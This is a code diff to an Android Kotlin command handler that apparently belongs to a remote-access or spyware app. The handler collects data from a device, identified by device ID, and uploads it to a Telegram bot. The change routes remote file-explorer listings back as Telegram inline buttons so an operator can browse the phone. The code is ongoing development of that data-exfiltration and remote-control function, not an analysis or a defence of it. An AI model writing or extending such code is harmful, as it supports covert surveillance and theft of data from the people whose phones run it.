@@ -85,9 +85,35 @@ class CommandHandler(
                     else if (result is CollectedData.JsonResult) {
                         val text = result.json
                         if (text.isNotEmpty() && text != "[]" && text != "{}" && text != "\"[]\"") {
-                            val file = saveTextToFile(text, command, deviceId)
-                            uploadFileToBot(file, command, deviceId, "document")
-                            file.delete()
+
+                            // ⚠️ CRITICAL FIX: If this is a file_list JSON, send via command_response
+                            // so the server can render it as inline keyboard buttons in Telegram.
+                            // Do NOT upload as a document file - that's what was causing the
+                            // "compressed file" issue in the file explorer.
+                            var isFileList = false
+                            try {
+                                val parsed = JSONObject(text)
+                                if (parsed.optString("type") == "file_list") {
+                                    isFileList = true
+                                    val response = JSONObject().apply {
+                                        put("command", command)
+                                        put("status", "success")
+                                        put("data", text)
+                                        put("device_id", deviceId)
+                                    }
+                                    sendResponse(response)
+                                    Log.i(TAG, "✅ Sent file_list via command_response (inline keyboard)")
+                                }
+                            } catch (e: Exception) {
+                                // Not a JSON object - fall through to normal handling
+                            }
+
+                            // Regular JSON: save as text file and upload as document
+                            if (!isFileList) {
+                                val file = saveTextToFile(text, command, deviceId)
+                                uploadFileToBot(file, command, deviceId, "document")
+                                file.delete()
+                            }
                         } else {
                             val response = JSONObject().apply {
                                 put("command", command)
